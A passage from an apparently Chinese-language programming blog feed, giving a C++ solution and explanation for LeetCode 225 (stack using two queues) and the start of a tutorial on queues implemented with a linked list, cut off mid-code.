class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q1;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt;q2;</span><br><span class="line">    <span class="built_in">MyStack</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        q1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = q1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;empty queue&quot; &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="comment">//the last element in the queue</span></span><br><span class="line">            <span class="keyword">if</span>(i==size<span class="number">-1</span>) &#123;</span><br><span class="line">                result = q1.<span class="built_in">front</span>();</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="comment">//copy q2 to q1</span></span><br><span class="line">                size = q2.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">                    q1.<span class="built_in">push</span>(q2.<span class="built_in">front</span>());</span><br><span class="line">                    q2.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                size =<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                q2.<span class="built_in">push</span>(q1.<span class="built_in">front</span>());</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q1.<span class="built_in">empty</span>()) <span class="keyword">return</span> q1.<span class="built_in">back</span>();</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;empty queue&quot; &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack* obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>一開始宣告兩個 <code>int</code> 型別的Queue, q1 和 q2</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q1;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q2;</span><br></pre></td></tr></table></figure><p><code>push</code> 函數將元素 x 推入Stack中，實際操作其實是將資料加入到 <code>q1</code> 的尾部</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    q1.<span class="built_in">push</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pop</code> 函數，首先檢查 <code>q1</code> 是否為空，如果回空直接返回。接著就是迭代 <code>q1</code> queue，將除了最後一個資料的其他資料從 <code>q1</code> 移動到 <code>q2</code>，一旦發現最後一個資料，將它保存在　<code>result</code> 變數中，並將最後元素從 <code>q1</code> pop 出來，接著將 <code>q2</code> queue中資料全部移動回 <code>q1</code>，方便下一次的 push操作。最後就是回傳 <code>result</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> size = q1.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">if</span>(q1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==size<span class="number">-1</span>) &#123;</span><br><span class="line">            result = q1.<span class="built_in">front</span>();</span><br><span class="line">            q1.<span class="built_in">pop</span>();</span><br><span class="line">            size = q2.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">                q1.<span class="built_in">push</span>(q2.<span class="built_in">front</span>());</span><br><span class="line">                q2.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            size =<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            q2.<span class="built_in">push</span>(q1.<span class="built_in">front</span>());</span><br><span class="line">            q1.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>top</code> 函數用來檢查stack的最頂端資料值，但以queue的角度看會是最後進入queue的末端元素，因此直接使用 <code>back()</code> 回傳資料值，當然一樣要先檢查 <code>q1</code> 是否為空。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!q1.<span class="built_in">empty</span>()) <span class="keyword">return</span> q1.<span class="built_in">back</span>();</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>empty()</code> 函數就是確認stack是否為空，而這裡也就是要確認queue是否為空。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q1.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/225/result.jpeg"></p><h3 id="完整程式碼"><a href="#完整程式碼" class="headerlink" title="完整程式碼"></a>完整程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q1;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt;q2;</span><br><span class="line">    <span class="built_in">MyStack</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        q1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = q1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="comment">//the last element in the queue</span></span><br><span class="line">            <span class="keyword">if</span>(i==size<span class="number">-1</span>) &#123;</span><br><span class="line">                result = q1.<span class="built_in">front</span>();</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="comment">//copy q2 to q1</span></span><br><span class="line">                size = q2.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">                    q1.<span class="built_in">push</span>(q2.<span class="built_in">front</span>());</span><br><span class="line">                    q2.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                size =<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                q2.<span class="built_in">push</span>(q1.<span class="built_in">front</span>());</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q1.<span class="built_in">empty</span>()) <span class="keyword">return</span> q1.<span class="built_in">back</span>();</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    MyStack sk;</span><br><span class="line">    sk.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Stack push: 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">push</span>(<span class="number">2</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Stack push: 2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">push</span>(<span class="number">3</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Stack push: 3&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Pop the top element, which is: &quot;</span> &lt;&lt;  sk.<span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// sk.push(4);</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;Stack push: 4&quot; &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;Pop the top element, which is:&quot; &lt;&lt;  sk.pop() &lt;&lt; endl;</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Pop the top element, which is:&quot;</span> &lt;&lt;  sk.<span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Pop the top element, which is:&quot;</span> &lt;&lt;  sk.<span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Is the stack empty? &quot;</span> &lt;&lt; sk.<span class="built_in">empty</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Check the top element:&quot;</span> &lt;&lt; sk.<span class="built_in">top</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><code>push(int x)</code> 的時間複雜度為 $O(1)$</li><li><code>pop()</code> 的時間複雜度為 $O(n)$，第一次 for 循環將 <code>q1</code> 中的元素轉移到 <code>q2</code>，除了最後一個元素。這需要 $O(n)$ 的時間，其中 <code>n</code> 是 <code>q1</code> 的大小。第二次 for 將 <code>q2</code> 中的元素轉移回 <code>q1</code>，這也需要 $O(n)$ 的時間</li><li><code>top()</code> 的時間複雜度為 $O(1)$</li><li><code>empty()</code> 的時間複雜度為 $O(1)$</li></ul><p>整體的空間複雜度為 $O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>使用兩個 queue來儲存資料，每個queue可能包含n個元素，因此整體會是 $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
            <tag> Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 佇列 (Queue) | LeetCode 筆記</title>
      <link href="/posts/22a8b30b.html"/>
      <url>/posts/22a8b30b.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-Queue"><a href="#甚麼是-Queue" class="headerlink" title="甚麼是 Queue?"></a>甚麼是 Queue?</h1><p>Queue 也是一種資料結構，用於暫時儲存元素 ，它與 Stack 不同的是，它是屬於 <strong>FIFO (First-In-First-Out)</strong> 的特性，也就是先進入 Queue 的元素先出來，並且新元素會被加入到 Queue 的尾端。</p><p>通常 Queue 會被應用在需要具有順序一致性的系統中，像是網路封包處理、OS的 Process Schedule, BFS等等，反正就是想像是在排隊買票的感覺。</p><h2 id="Queue-操作"><a href="#Queue-操作" class="headerlink" title="Queue 操作:"></a>Queue 操作:</h2><ul><li>隊伍前方: <code>front</code></li><li>隊伍後方: <code>back</code></li><li>進入隊伍: <code>push</code>, 一定只能從 <code>back</code> 進入</li><li>離開隊伍: <code>pop</code>, 一定只能從 <code>front</code> 離開</li></ul><!-- 可以插入手繪圖片 --><ul><li><code>Push(data)</code>: 將 data 從 back 放入Queue， 並更新成新的back，在Queue 中新增資料又稱 <code>enqueue</code></li><li><code>Pop</code>: 把 front 指向的資料從Queue 中移除，並且更新front，從Queue中移除資料的行為又稱 <code>dequeue</code></li><li><code>getFront</code>: 回傳 front 所指向的資料</li><li><code>getBack</code>: 回傳 back 所指向的資料</li><li><code>IsEmpty</code>: 檢查 Queue 中是否有資料</li><li><code>getSize</code>: 回傳 Queue 中的資料個數</li></ul><h1 id="Queue-實作-C"><a href="#Queue-實作-C" class="headerlink" title="Queue 實作 (C++)"></a>Queue 實作 (C++)</h1><h2 id="以-Linked-List-實踐-Queue"><a href="#以-Linked-List-實踐-Queue" class="headerlink" title="以 Linked List 實踐 Queue"></a>以 Linked List 實踐 Queue</h2><p><img src="/img/LeetCode/queue/queue1.png"></p><ul><li>Queue中的 front 即為 linked list 中的 first node，而back則為list中的最後一個節點</li><li>但由於一個 Queue 會需要，getfront 跟 getBack，因此除了會需要有個 pointer紀錄front節點，還需要一個pointer 紀錄back節點</li></ul><h3 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QueueNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    QueueNode *next;</span><br><span class="line">    <span class="built_in">QueueNode</span>(): <span class="built_in">data</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">    <span class="built_in">QueueNode</span>(<span class="type">int</span> x):<span class="built_in">data</span>(x), <span class="built_in">next</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QueueList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        QueueNode *front;</span><br><span class="line">        QueueNode *back;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">QueueList</span>(): <span class="built_in">front</span>(<span class="number">0</span>), <span class="built_in">back</span>(<span class="number">0</span>), <span class="built_in">size</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getBack</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">IsEmpty</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        front = <span class="keyword">new</span> <span class="built_in">QueueNode</span>(x);</span><br><span class="line">        back = front;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    QueueNode *newNode = <span class="keyword">new</span> <span class="built_in">QueueNode</span>(x);</span><br><span class="line">    back-&gt;next = newNode;</span><br><span class="line">    back = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        QueueNode *tempNode = front;</span><br><span class="line">        front = front-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> tempNode;</span><br><span class="line">        tempNode = <span class="number">0</span>;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> front-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> back-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueList::IsEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span 